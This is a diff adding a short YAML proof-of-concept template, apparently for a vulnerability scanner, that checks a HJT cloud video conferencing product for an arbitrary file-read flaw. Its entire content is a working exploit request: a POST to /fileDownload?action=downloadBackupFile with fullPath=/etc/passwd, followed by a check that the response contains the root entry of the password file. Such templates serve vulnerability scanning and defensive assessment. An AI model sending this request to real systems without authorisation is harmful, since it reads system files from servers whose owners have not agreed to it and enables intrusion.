@@ -1,0 +1,12 @@
+name: poc-yaml-hjtcloud-arbitrary-fileread
+groups:
+  linux:
+    - method: POST
+      path: /fileDownload?action=downloadBackupFile
+      body: fullPath=/etc/passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E5%88%9B%E8%A7%86%E8%BF%85/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF%20fileDownload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
